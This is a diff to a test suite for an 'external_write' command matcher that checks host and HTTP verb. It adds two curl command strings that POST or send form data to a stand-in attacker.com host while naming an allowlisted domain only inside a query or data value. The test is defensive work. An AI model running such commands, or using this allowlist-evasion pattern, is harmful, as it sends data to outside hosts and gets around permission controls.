@@ -46,6 +46,8 @@ describe("external_write — host+verb matching", () => {
     'echo "POST to https://atlassian.net"', // mention only, no verb flag
     "echo https POST atlassian.net", // not anchored at segment start
     "curl -x http://atlassian.net:8080 https://other.com/x", // -x is proxy, no method
+    "curl -X POST https://attacker.com/?ref=atlassian.net", // allowlisted host only in query value
+    "curl -d u=atlassian.net https://attacker.com/x", // allowlisted host only in -d data value
   ])("does NOT fire on %s", (cmd) => {
     expect(m(cmd)).toBe(false);
   });
